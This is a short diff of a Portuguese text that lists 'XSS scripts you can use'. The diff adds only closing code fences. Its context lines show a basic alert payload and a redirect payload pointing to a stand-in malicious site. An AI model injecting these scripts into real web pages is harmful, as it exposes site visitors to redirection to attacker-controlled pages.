@@ -14,8 +14,10 @@ Aqui estão alguns exemplos de scripts XSS que você pode usar:
 1. Script XSS básico:
 ```html
 <script>alert("Este é um ataque XSS!");</script>
+```
 
 2. Script XSS de redirecionamento:
 ```html
 <script>window.location.href = 'http://www.site-malicioso.com';</script>
+```
 
